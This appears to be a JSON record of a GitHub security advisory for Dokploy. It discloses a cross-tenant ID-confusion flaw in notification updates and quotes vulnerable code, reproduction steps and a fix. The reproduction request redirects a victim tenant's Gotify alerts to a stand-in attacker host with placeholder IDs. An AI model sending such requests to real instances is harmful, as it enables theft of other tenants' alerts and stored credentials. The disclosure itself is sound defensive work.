@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-wf8r-8h5f-pxqm",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 7.6,
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-639"
+    ],
+    "description": "## Summary\r\n\r\nAn organization administrator may update that organization's notification providers. Authorizing one parent notification must not permit changes to an independently supplied child provider owned by another tenant.\r\n\r\nEvery notification update accepts two independent global IDs, a parent `notificationId` and a provider-specific child ID such as `slackId`, `gotifyId`, or `teamsId`. The router authorizes only the parent. The service then updates the separately supplied child without verifying that it belongs to the authorized notification or organization.\r\n\r\nAn attacker can create an attacker-owned notification, pass its authorized parent ID together with another tenant's child ID, and replace the victim webhook, server URL, token, email credentials, or API key. Future deployment, build-error, backup, restart, cleanup, and server-threshold alerts can be redirected to the attacker or suppressed.\r\n\r\nThere is a second variant on self-hosted installations. Ownership checks for Gotify, ntfy, Mattermost, Lark, Teams, and Pushover run only when `IS_CLOUD` is true. Supplying a foreign parent ID reassigns that notification's `organizationId` to the attacker's active organization, after which `notification.one` returns its stored credentials.\r\n\r\n## Details\r\n\r\nThe router authorizes only the parent ID and then forwards both client-supplied IDs to the update service.\r\n\r\n```ts\r\nconst notification = await findNotificationById(input.notificationId);\r\nif (notification.organizationId !== ctx.session.activeOrganizationId) {\r\n  throw new TRPCError({ code: \"UNAUTHORIZED\" });\r\n}\r\n\r\nawait updateSlackNotification({\r\n  ...input,\r\n  organizationId: ctx.session.activeOrganizationId,\r\n});\r\n```\r\n\r\nThe service updates the parent and child with independent predicates.\r\n\r\n```ts\r\nawait tx.update(notifications)\r\n  .set({ ... })\r\n  .where(eq(notifications.notificationId, input.notificationId));\r\n\r\nawait tx.update(slack)\r\n  .set({ webhookUrl: input.webhookUrl, ... })\r\n  .where(eq(slack.slackId, input.slackId));\r\n```\r\n\r\nNo query joins the child to the authorized parent. The same pattern affects Slack, Telegram, Discord, Email, Resend, Gotify, ntfy, Mattermost, Custom, Lark, Teams, and Pushover updates.\r\n\r\nFor six provider types, the parent ownership check is additionally limited to Dokploy Cloud. On self-hosted installations the foreign parent is accepted.\r\n\r\n```ts\r\nif (IS_CLOUD && notification.organizationId !== activeOrganizationId) {\r\n  throw new TRPCError({ code: \"UNAUTHORIZED\" });\r\n}\r\n```\r\n\r\n## Steps to reproduce\r\n\r\n1. As an administrator of Organization A, create a notification and record its parent `notificationId`.\r\n2. Obtain Organization B's provider child ID, for example its `gotifyId`, through a separate disclosure or prior access. `notification.all` is scoped to the active organization, and the reviewed routes do not give an unrelated Organization A administrator a way to enumerate Organization B's child nanoids.\r\n3. Combine the attacker-owned parent ID with the victim child ID in one update request.\r\n\r\n```http\r\nPOST /api/trpc/notification.updateGotify?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=ATTACKER_SESSION\r\n\r\n{\"0\":{\"json\":{\r\n  \"notificationId\": \"ATTACKER_PARENT_ID\",\r\n  \"gotifyId\": \"VICTIM_GOTIFY_ID\",\r\n  \"serverUrl\": \"https://attacker.example\",\r\n  \"appToken\": \"attacker-token\"\r\n}}}\r\n```\r\n\r\n4. The parent authorization succeeds because `ATTACKER_PARENT_ID` belongs to Organization A. The service updates `VICTIM_GOTIFY_ID` anyway.\r\n5. Trigger any alert enabled on the victim notification and observe it sent to the attacker's Gotify endpoint.\r\n\r\n## Impact\r\n\r\nAn attacker can redirect or suppress another tenant's operational and security alerts. Redirected messages disclose application and project names, deployment status, build failures, backup status, server names, resource thresholds, and operational timing. On self-hosted instances, the second variant can reparent affected notifications and expose their stored provider credentials through the normal read API.\r\n\r\n## Recommendation\r\n\r\nDerive the provider child ID from the authorized parent row and remove child IDs from update input. Update through a parent/child join scoped to `activeOrganizationId`. Apply ownership checks on every deployment mode and never change `organizationId` during a notification update.\r\n",
+    "ghsa_id": "GHSA-wf8r-8h5f-pxqm",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-wf8r-8h5f-pxqm",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-wf8r-8h5f-pxqm"
+      }
+    ],
+    "published_at": "2026-11-12T08:15:17Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Notification parent/child ID confusion allows cross-tenant alert and credential hijacking",
+    "updated_at": "2026-11-12T08:15:17Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
